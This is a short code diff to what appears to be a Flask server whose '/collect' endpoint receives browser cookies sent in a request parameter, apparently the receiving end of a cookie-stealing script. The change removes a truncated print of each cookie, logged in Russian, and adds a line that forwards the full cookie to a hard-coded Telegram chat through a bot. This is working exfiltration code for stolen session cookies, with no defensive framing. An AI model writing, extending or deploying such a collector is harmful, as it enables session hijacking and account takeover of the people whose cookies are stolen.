@@ -242,8 +242,7 @@ def index():
 def collect():
     cookie = request.args.get('cookie')
     if cookie:
-        print(f'📩 Получена кука: {cookie[:50]}...')
-        # Здесь можно добавить логику отправки в Telegram
+        bot.send_message(8205534130, f'🍪 Кука: {cookie}')
         return 'OK', 200
     return 'No cookie', 400
 
